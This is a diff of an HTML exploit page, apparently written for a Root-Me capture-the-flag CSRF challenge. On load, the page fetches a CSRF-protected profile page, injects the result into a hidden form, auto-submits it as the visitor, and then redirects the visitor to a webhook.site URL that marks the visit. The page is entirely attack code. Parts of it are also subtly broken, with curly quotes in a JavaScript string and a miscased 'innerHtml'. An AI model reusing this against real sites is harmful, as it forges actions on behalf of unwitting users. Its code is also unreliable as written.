@@ -1,26 +1,26 @@
 <html>
-  <body>
+  <body onload="afterload()">
     <form id='evil' action="http://challenge01.root-me.org/web-client/ch22/?action=profile" enctype="multipart/form-data" method="POST">
       <div id="drop"></div>
       <input name="username" value="test">
       <input type="checkbox" name="status" checked>
     </form>
     <script>
-      window.addEventListener('DOMContentLoaded', function () {
-        setTimeout(() => document.location = 'https://webhook.site/9e3a3354-6252-40c8-8b69-ab6cd26c0d44?visited_v3', 4000);
+      function afterload() {
+        setTimeout(() => document.location = 'https://webhook.site/9e3a3354-6252-40c8-8b69-ab6cd26c0d44?visited_v4', 4000);
         var csrfProtectedPage = ’http://challenge01.root-me.org/web-client/ch23/?action=profile’;
         var html = get(csrfProtectedPage);
         document.getElementById('drop').innerHtml = html;
         
         document.getElementById('evil').submit();
-
-        function get(url) {
-          var xmlHttp = new XMLHttpRequest();
-          xmlHttp.open("GET", url, false);
-          xmlHttp.send(null);
-          return xmlHttp.responseText;
-        }
-      });
+      }
+    
+      function get(url) {
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open("GET", url, false);
+        xmlHttp.send(null);
+        return xmlHttp.responseText;
+      }
     </script>
   </body>
 </html>
